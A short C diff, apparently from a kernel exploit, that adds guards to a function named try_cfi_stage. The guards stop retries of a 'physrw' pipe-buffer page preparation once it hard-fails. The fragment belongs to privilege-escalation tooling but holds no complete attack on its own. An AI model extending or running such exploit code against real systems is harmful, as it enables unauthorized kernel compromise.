@@ -532,6 +532,11 @@ int try_cfi_stage(void) {
             "attempt=%d/%d\n",
             pipebuf_page_base, first_leak_attempt + 1,
             PIPE_FIRST_LEAK_ATTEMPTS);
+    if (pipe_prepare_hard_failed) {
+      pr_warning("fresh physrw pipe preparation hard-failed; refusing "
+                 "unsafe retry\n");
+      break;
+    }
     if (is_direct_ptr(pipebuf_page_base)) {
       break;
     }
@@ -553,6 +558,11 @@ int try_cfi_stage(void) {
       pipebuf_page_base = prepare_pipe_buffer_page();
       pr_info("fresh physrw retry page attempt=%d/%d base=%016zx\n",
               attempt + 1, PIPE_MAX_ATTEMPTS, pipebuf_page_base);
+      if (pipe_prepare_hard_failed) {
+        pr_warning("fresh physrw retry preparation hard-failed; refusing "
+                   "additional attempts\n");
+        break;
+      }
       if (!is_direct_ptr(pipebuf_page_base)) {
         continue;
       }
